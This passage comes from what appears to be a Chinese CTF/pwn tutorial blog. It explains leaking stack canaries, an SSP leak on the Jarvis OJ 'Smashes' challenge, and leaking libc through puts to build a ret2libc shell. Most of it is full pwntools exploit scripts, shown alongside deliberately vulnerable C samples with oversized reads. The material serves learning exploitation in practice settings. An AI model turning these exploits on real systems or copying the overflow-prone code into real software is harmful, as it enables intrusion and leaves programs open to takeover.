sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"bye~"</span><span class="token punctuation">)</span>
puts_got<span class="token operator">=</span>u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"puts_got:"</span><span class="token operator">+</span><span class="token string">'0x'</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
puts_got<span class="token operator">=</span>hex<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span>
puts_got<span class="token operator">=</span>int<span class="token punctuation">(</span>puts_got<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
libc_base<span class="token operator">=</span>puts_got<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"libc_base:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>

sys_addr<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"sys_addr:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>

sh_addr<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"sh_addr:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>sh_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>

one_addr<span class="token operator">=</span>libc_base<span class="token operator">+</span><span class="token number">0x45216</span>
<span class="token comment" spellcheck="true"># gdb.attach(sh)</span>
<span class="token comment" spellcheck="true"># pause()</span>
payload2<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x47</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>sh_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x4006b8</span><span class="token punctuation">)</span>
payload3<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x48</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>one_addr<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>执行即可getshell</p>
<p><img src="https://ae01.alicdn.com/kf/H26596ab1eb714c7cb3f943d21e85d677o.png" alt></p>
<h2 id="样例-攻防世界-进阶区-welpwn"><a href="#样例-攻防世界-进阶区-welpwn" class="headerlink" title="样例(攻防世界-进阶区-welpwn)"></a>样例(攻防世界-进阶区-welpwn)</h2><blockquote>
<p>第一次看见这个标题的时候以为是pwn的入门题..果然被骗了！</p>
</blockquote>
<p>老样子 先正常起手式</p>
<p><img src="https://ae01.alicdn.com/kf/Hf1a8a25607ca499fae38283b4a04d3dfO.png" alt></p>
<p>载入IDA 发现特别迷幻的地方 似乎整个程序都没有洞… 尝试动态调试下吧</p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script></body></html>]]></content>
      
        <categories>
            
            <category> PWN </category>
            
        </categories>
        
        
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[如何泄漏PWN中的一些信息]]></title>
      <url>/2019/11/01/ru-he-xie-lou-pwn-zhong-de-yi-xie-xin-xi/</url>
      <content type="html"><![CDATA[<html><head></head><body><h2 id="敏感函数"><a href="#敏感函数" class="headerlink" title="敏感函数"></a>敏感函数</h2><p>一般来说 所有有向屏幕输出功能的函数都有泄漏Libc的可能 但是主要用到还是以下几个函数</p>
<h3 id="puts"><a href="#puts" class="headerlink" title="puts"></a>puts</h3><p>puts函数嘛…我们的老常客..大部分漏洞都会用到它 需要注意的是 puts的截断标准是遇到 <strong>\0</strong> 即从某个地址开始一直输出 直到遇到\0为止</p>
<h3 id="write"><a href="#write" class="headerlink" title="write"></a>write</h3><p>write函数也是大部分泄漏时利用的函数</p>
<p>函数原型: write(int fd,const void *buf,size_t size)</p>
<blockquote>
<p>fd是文件操作符 当fd=1时就是向屏幕上输出 指针buf处长度为size的数据</p>
</blockquote>
<h2 id="泄漏Canary"><a href="#泄漏Canary" class="headerlink" title="泄漏Canary"></a>泄漏Canary</h2><blockquote>
<p>Canary值 是在程序使用gcc编译时 开启Canary保护后生成的一个随机的值 通常会在每个函数开始时将其插入到栈中 目的是在函数返回前 检测函数的栈 (主要是返回地址) 有没有遭到攻击者篡改 通过以上描述 可以很清晰的知道 如果我们不知道Canary值的话 是不可能进行ROP操作的 在没有Canary值的情况下基本限制死了攻击者对栈上的攻击</p>
</blockquote>
<h3 id="泄漏Canary值"><a href="#泄漏Canary值" class="headerlink" title="泄漏Canary值"></a>泄漏Canary值</h3><p>先给出样例</p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token keyword">void</span> <span class="token function">sys</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
      <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
      <span class="token keyword">char</span> a<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
      <span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span>
      <span class="token keyword">while</span> <span class="token punctuation">(</span>i<span class="token punctuation">)</span>
      <span class="token punctuation">{</span>            
            <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>a<span class="token punctuation">,</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">puts</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
            i<span class="token operator">--</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<blockquote>
<p>编译指令: gcc -no-pie 输出文件名 源码名</p>
</blockquote>
<p>首先使用checksec查看一下保护</p>
<p><img src="https://ae01.alicdn.com/kf/Ha848a116c2fa44208a905701b54e09bbl.png" alt></p>
<p>确认和预先料想的一样 开启了Canary保护 载入IDA</p>
<p>通过观察流程图 我们可以发现 在程序最后会校验 var_8 这个变量 如果变量和预先值不同 就触发 stack_chk_fail函数 至于这个函数的功能…看看名字就知道了啊喂… 通过这个我们就能了解 var_8变量储存的就是我们Canary值 要想通过栈溢出直接跳转到 sys函数拿到shell 就需要先泄漏出来它 </p>
<p>通过阅读IDA的代码和栈图 我们可以明确得知程序的流程 main函数内部将会执行两次 且我们的输入是可以溢出到Canary值的 </p>
<blockquote>
<p>这里要介绍一下Canary值的特性 Canary值是随机的 但是最后两位一定是00 目的是为了00截断防止前面录入的字符串输出时 捎带着把Canary值输出出来</p>
</blockquote>
<p>那么思考一下 我们可以利用Canary值的特性 我们破坏掉值最后的00 通过输出函数将其输出出来不就好了么 等到main函数第二遍执行的时候 我们将泄漏出来的值再覆盖回去即可 </p>
<p>脚本如下</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>
sh<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">"./canary"</span><span class="token punctuation">)</span>
file<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"./canary"</span><span class="token punctuation">)</span>
sys_addr<span class="token operator">=</span>file<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'sys'</span><span class="token punctuation">]</span>
payload<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x68</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x68</span><span class="token punctuation">)</span>
canary<span class="token operator">=</span>u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x0a</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"canary:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token punctuation">)</span>


payload2<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x68</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>file<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>


sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<blockquote>
<p>这里纠结了好久 不清楚为什么打不开shell 很是头疼加恼火 以后再处理 这里返回主函数以证明确实绕过了Canary保护 并实现了栈溢出</p>
</blockquote>
<h3 id="利用stack-chk-fail漏洞"><a href="#利用stack-chk-fail漏洞" class="headerlink" title="利用stack_chk_fail漏洞"></a>利用stack_chk_fail漏洞</h3><p>其实这是另外一种叫做SSP Leak的手法.. 其目的是故意触发Canary保护 让程序流向stack_chk_fail函数</p>
<blockquote>
<p>首先来科普下 stack_chk_fail的函数原型</p>
<pre class=" language-c"><code class="language-c"><span class="token function">__stack_chk_fail</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> 
<span class="token punctuation">{</span>

<span class="token function">__fortify_fail</span> <span class="token punctuation">(</span><span class="token string">"stack smashing detected"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span></code></pre>
<pre class=" language-c"><code class="language-c"><span class="token function">__fortify_fail</span> <span class="token punctuation">(</span>msg<span class="token punctuation">)</span>
constchar<span class="token operator">*</span>msg<span class="token punctuation">;</span> 
<span class="token punctuation">{</span>

<span class="token comment" spellcheck="true">/* The loop is added only to keep gcc happy. */</span>

<span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

<span class="token function">__libc_message</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"*** %s ***: %s terminated\n"</span><span class="token punctuation">,</span> msg<span class="token punctuation">,</span>__libc_argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">)</span>

<span class="token punctuation">}</span>
<span class="token function">libc_hidden_def</span> <span class="token punctuation">(</span>__fortify_fail<span class="token punctuation">)</span></code></pre>
</blockquote>
<p>可以通过函数明确了解到 如果我们能控制argv[0]指针的位置 那我们就能输出任意值<br>而控制argv[0]的位置通常有两种方式 一种是暴力覆盖 因为其为一个变量 且通常为文件名 那么他就一定在栈上 通过栈溢出 直接覆盖全部栈为我们想要的地址 就一定会将argv[0]指针的值覆盖为我们想要的 还有一种就是计算偏移 因为其值为文件名 观察栈指定覆盖即可</p>
<h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><p>这里使用 Jarvis OJ 的题目Smashes 进行演示</p>
<p>首先checksec 查看保护</p>
<p><img src="https://ae01.alicdn.com/kf/Hbd06c905aa8946aa988f134913022d9bB.png" alt></p>
<p>发现开有Canary保护 不能直接进行ROP 载入IDA 发现没有任何能用于输出flag的方式 但是发现一个奇怪的字符串</p>
<p><img src="https://ae01.alicdn.com/kf/Hedb1c5785ce645b7820b506d8ff69021X.png" alt></p>
<p>也就是说flag的地址就是这个地方 如果写出脚本能够输出这个位置的值 就能得到flag</p>
<p>联系到SSP leak 我们可以故意触发stack_chk_fail函数 然后将指针指向这个地址就能利用报错信息输出flag了</p>
<p>但是看到主函数的最后一句 发现这个位置的flag会在主函数返回之前就清除掉 这个时候就需要用到ELF的重映射了</p>
<p><img src="https://ae01.alicdn.com/kf/Hc3145c65c7a74b149a1db1c3b888bf83f.png" alt></p>
<p>我们使用gdb 看看程序是否有flag的重映射</p>
<p><img src="https://ae01.alicdn.com/kf/H4a5f879530e04a619be0925cdc11a758s.png" alt></p>
<p>发现在0x400d20处还映射的有flag 那么我们直接将0x400d20覆盖满整个栈即可</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
r<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'pwn.jarvisoj.com'</span><span class="token punctuation">,</span><span class="token number">9877</span><span class="token punctuation">)</span>

r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'name?'</span><span class="token punctuation">)</span>
payload<span class="token operator">=</span>p64<span class="token punctuation">(</span><span class="token number">0x400d20</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">200</span>
r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p>运行脚本即可</p>
<p><img src="https://ae01.alicdn.com/kf/Ha99e3eabb7d447afa66ab934d84f2b12X.png" alt></p>
<h2 id="泄漏libc"><a href="#泄漏libc" class="headerlink" title="泄漏libc"></a>泄漏libc</h2><blockquote>
<p>这里先科普下libc是什么 以及泄漏libc有什么用</p>
<p>可以直接将libc理解为是C的函数库 但是里面存的不是函数的具体地址 而是函数相对于libc基地址的偏移 </p>
<p>在程序的某个函数执行过一次之后 在GOT表中就会存有函数的真实地址 这样我们如果有能力泄露出来真实地址 再减去Libc中的偏移就能得到libc基地址 有了基地址之后 可以根据libc中的偏移 执行任意函数 </p>
<p>当然这是有libc库的情况 如果没有的话就需要先泄漏出来两个函数的真实地址 然后再相减做计算了 </p>
</blockquote>
<p>通常来说泄漏libc最主要的目的就是进行ROP 也就是获取libc基地址及各个函数的偏移 那么这里直接给出测试源码</p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
      <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">int</span> num<span class="token punctuation">;</span>
      <span class="token keyword">char</span> str<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
      <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
      <span class="token punctuation">{</span>
            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"------------------------------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"1.store\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"2.print\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"3.quit\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token keyword">switch</span> <span class="token punctuation">(</span>num<span class="token punctuation">)</span>
            <span class="token punctuation">{</span>
            <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>
                  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>str<span class="token punctuation">,</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                  <span class="token keyword">break</span><span class="token punctuation">;</span>
            <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span>
                  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>
                  <span class="token keyword">break</span><span class="token punctuation">;</span>
            <span class="token keyword">case</span> <span class="token number">3</span><span class="token punctuation">:</span>
                  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
            <span class="token keyword">default</span><span class="token punctuation">:</span>
                  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"error!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
      <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>
<blockquote>
<p>编译指令 gcc -no-pie 文件名 -o 源码名</p>
</blockquote>
<p>可以看到 在整个程序内没有调用system函数 也没有出现/bin/sh 字符串 如果不泄露libc的话 这题是写不下去的</p>
<p>首先可以明确有以下条件</p>
<blockquote>
<p>1.程序存在栈溢出漏洞 </p>
<p>2.程序在while(1)内 可以无限次数循环 </p>
<p>3.程序已经调用过puts函数 可以利用puts函数来泄漏libc</p>
<p>4.即使开启了Canary保护我们在栈溢出的条件下依旧可以泄漏出来Canary值</p>
</blockquote>
<p>有了以上条件 基本思路也就可以形成了<br>首先是需要去泄漏出来puts函数的真实地址 然后再利用给出的libc文件 计算出libc的基地址 最后通过栈溢出 拿到shell </p>
<p>当然在有Canary保护的情况下首先还是应该泄漏Canary的值 </p>
<pre class=" language-python">sh.recvuntil("><code class="language-python">sh.recvuntil(">> ")
sh.sendline("1")
payload='a'*0x68
sh.sendline(payload)

sh.recvuntil(">> ")
sh.sendline("2")
sh.recvuntil('a'*0x68)
canary=u64(sh.recv(8))-0x0a
log.info("canary:"+hex(canary))</code></pre>
<p>这样 就可以利用栈溢出 覆盖掉Canary的\x00 然后成功泄漏出Canary值 </p>
<p><img src="https://ae01.alicdn.com/kf/H0a7101de549443aba47e08b1de23b8055.png" alt></p>
<p>在有了Canary值后 就可以肆无忌惮的进行栈溢出 不用怕chk_stack_fail了… 那么下一步就是为了泄漏libc基地址做准备 回看一下程序源码 发现puts函数和read函数是执行过的 可以根据个人喜好自己泄漏相对于的真实地址 这里我选择的是puts地址 </p>
<pre class=" language-python">sh.recvuntil("><code class="language-python">sh.recvuntil(">> ")
sh.sendline("1")
payload2='a'*0x68+p64(canary)+'a'*0x8+p64(pop_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr)
sh.sendline(payload2)

sh.recvuntil(">> ")
sh.sendline('3')



puts_got=u64(sh.recv(6).ljust(8,'\x00'))
log.info("puts_got:"+hex(puts_got))</code></pre>
<p><img src="https://ae01.alicdn.com/kf/Hc2e83934915d427b915f9437089a01b0u.png" alt></p>
<p>剩下就简单多了 计算基地址 计算system函数偏移 和/bin/sh偏移 然后调用即可</p>
<pre class=" language-python"><code class="language-python">libc_base<span class="token operator">=</span>puts_got<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"libc_base:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
sys_addr<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"sys_addr:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
bin_addr<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"bin_addr:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>bin_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>
payload3<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x68</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bin_addr<span class="token punctuation">)</span>
payload3<span class="token operator">+=</span>p64<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span>
payload3<span class="token operator">+=</span>p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span>


sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload3<span class="token punctuation">)</span>
gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>
pause<span class="token punctuation">(</span><span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p>完整脚本如下</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>

sh<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">"./test"</span><span class="token punctuation">)</span>
libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"./libc6_2.27-3ubuntu1_amd64.so"</span><span class="token punctuation">)</span>
file<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"./test"</span><span class="token punctuation">)</span>
main_addr<span class="token operator">=</span><span class="token number">0x400757</span>
puts_plt<span class="token operator">=</span>file<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
puts_got<span class="token operator">=</span>file<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
pop_addr<span class="token operator">=</span><span class="token number">0x00000000004008f3</span>

sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>
payload<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x68</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x68</span><span class="token punctuation">)</span>
canary<span class="token operator">=</span>u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x0a</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"canary:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>
payload2<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x68</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>



puts_got<span class="token operator">=</span>u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"puts_got:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token punctuation">)</span>
libc_base<span class="token operator">=</span>puts_got<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"libc_base:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
